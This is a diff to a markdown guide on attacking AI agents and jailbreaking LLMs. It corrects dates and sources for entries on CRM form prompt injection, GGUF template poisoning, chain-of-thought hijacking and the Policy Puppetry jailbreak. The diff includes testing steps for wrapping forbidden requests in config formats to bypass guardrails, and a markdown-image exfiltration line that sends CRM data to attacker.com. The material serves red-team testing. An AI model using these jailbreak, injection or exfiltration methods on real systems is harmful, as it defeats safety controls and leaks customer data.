@@ -15,14 +15,14 @@ Advanced techniques for bypassing AI safety filters and exploiting LLM/agent sys
   - [ForcedLeak: CRM Agent Form Injection](#forcedleak-crm-agent-form-injection)
   - [ZombieAgent: Zero-Click Memory Poisoning](#zombieagent-zero-click-memory-poisoning-via-email)
   - [SOUL.md Identity File Poisoning](#soulmd-identity-file-poisoning)
-  - [SpAIware: Persistent Memory Exfiltration](#spaIware-persistent-memory-exfiltration)
+  - [SpAIware: Persistent Memory Exfiltration](#spaiware-persistent-memory-exfiltration)
   - [Poisoned GGUF Model Templates](#poisoned-gguf-model-templates)
   - [RAG Pipeline Poisoning at Scale](#rag-pipeline-poisoning-at-scale)
 - [Jailbreak & Alignment Bypass](#jailbreak--alignment-bypass)
   - [Jailbreak Foundry (JBF)](#jailbreak-foundry-jbf--papers-to-runnable-attacks)
   - [TAO-Attack](#tao-attack--two-stage-optimization-jailbreak)
   - [Autonomous Jailbreak Agents](#autonomous-jailbreak-agents)
-  - [H-CoT: Chain-of-Thought Hijacking](#h-cot-hijacking-chain-of-thought)
+  - [H-CoT: Hijacking Chain-of-Thought](#h-cot-hijacking-chain-of-thought)
   - [GRP-Obliteration: Safety Alignment Removal](#grp-obliteration-single-prompt-safety-alignment-removal)
   - [Policy Puppetry: Universal LLM Jailbreak](#policy-puppetry-universal-llm-jailbreak)
   - [Semantic Chaining Jailbreak](#semantic-chaining-jailbreak)
@@ -72,7 +72,7 @@ Microsoft (Feb 2026): 50+ poisoning prompts from 31 companies across 14 industri
 
 ### ForcedLeak: CRM Agent Form Injection
 
-CVSS 9.4; CRM data exfiltration via Web-to-Lead form prompt injection + agent overreach + misconfigured CSP (Varonis, March 2026):
+CVSS 9.4; CRM data exfiltration via Web-to-Lead form prompt injection + agent overreach + misconfigured CSP (Noma discovery / Varonis write-up, September-October 2025):
 
 **How It Works:**
 - Attacker submits a Salesforce Web-to-Lead form with prompt injection in the description field
@@ -88,7 +88,7 @@ CVSS 9.4; CRM data exfiltration via Web-to-Lead form prompt injection + agent ov
 4. Check if CSP headers permit outbound requests to arbitrary domains
 5. Test markdown image injection as an exfiltration channel: `![img](https://attacker.com/steal?data=CRM_DATA)`
 
-**Severity Guidance:** Critical — zero-authentication attack against business-critical customer data. Maps to ASI01 (Agent Goal Hijack) + ASI02 (Tool Misuse) + ASI05 (Excessive Agency). Relevant for any enterprise using AI agents to process public-facing form submissions.
+**Severity Guidance:** Critical — zero-authentication attack against business-critical customer data. Maps to ASI01 (Agent Goal Hijack) + ASI02 (Tool Misuse) + ASI05 (Unexpected Code Execution). Relevant for any enterprise using AI agents to process public-facing form submissions.
 
 ### ZombieAgent: Zero-Click Memory Poisoning via Email
 
@@ -135,7 +135,7 @@ Exploits persistent memory for continuous data exfiltration across ALL future se
 
 ### Poisoned GGUF Model Templates
 
-Malicious Jinja2 code in GGUF chat templates (1.5M+ files on Hugging Face) executes during inference (Pillar Security, Jan 2026). **Testing:** If target loads community GGUF models, inject SSTI payloads in template fields; verify model provenance validation. Maps to ASI04.
+Malicious Jinja2 code in GGUF chat templates (1.5M+ files across public platforms including Hugging Face) executes during inference (Pillar Security, July 2025). **Testing:** If target loads community GGUF models, inject SSTI payloads in template fields; verify model provenance validation. Maps to ASI04.
 
 ### RAG Pipeline Poisoning at Scale
 
@@ -172,7 +172,7 @@ Large reasoning models acting as **autonomous adversaries** can systematically e
 
 ### H-CoT: Hijacking Chain-of-Thought
 
-Reasoning models that display intermediate thinking can have their chain-of-thought hijacked to bypass safety (February 2026):
+Reasoning models that display intermediate thinking can have their chain-of-thought hijacked to bypass safety (February 2025):
 
 **Key Findings:**
 - OpenAI o1 typically rejects 99%+ of child abuse/terrorism prompts — under H-CoT attack, rejection rate drops **below 2%**
@@ -206,7 +206,7 @@ A novel attack from Microsoft (February 2026) that can **remove an LLM's safety 
 
 ### Policy Puppetry: Universal LLM Jailbreak
 
-First universal alignment bypass working across all frontier models (ChatGPT, Claude, Gemini, DeepSeek, Llama, Mistral, Qwen) with no model-specific tuning (HiddenLayer, March 2026). Reformulates prompts as policy/config files (XML, INI, JSON format) — LLMs interpret structured input as system-level configuration, overriding safety alignment. "Point-and-shoot" — no technical expertise required. **Update (March 10, 2026):** HiddenLayer demonstrated Policy Puppetry also bypasses OpenAI's newer prompt injection detection guardrails — jailbreaks and injections in policy format evade detection layers. **Testing:** Wrap forbidden requests in XML/INI/JSON policy format; test if target model treats structured input as configuration; verify across multiple models without tuning; test against detection/guardrail layers specifically. **Severity:** Critical for any model API or AI application — validates that alignment and detection are fundamentally bypassable.
+First universal alignment bypass working across all frontier models (ChatGPT, Claude, Gemini, DeepSeek, Llama, Mistral, Qwen) with no model-specific tuning (HiddenLayer, April 2025). Reformulates prompts as policy/config files (XML, INI, JSON format) — LLMs interpret structured input as system-level configuration, overriding safety alignment. "Point-and-shoot" — no technical expertise required. **Update (March 2026):** HiddenLayer demonstrated Policy Puppetry also bypasses OpenAI's newer prompt injection detection guardrails — jailbreaks and injections in policy format evade detection layers. **Testing:** Wrap forbidden requests in XML/INI/JSON policy format; test if target model treats structured input as configuration; verify across multiple models without tuning; test against detection/guardrail layers specifically. **Severity:** Critical for any model API or AI application — validates that alignment and detection are fundamentally bypassable.
 
 ### Semantic Chaining Jailbreak
 
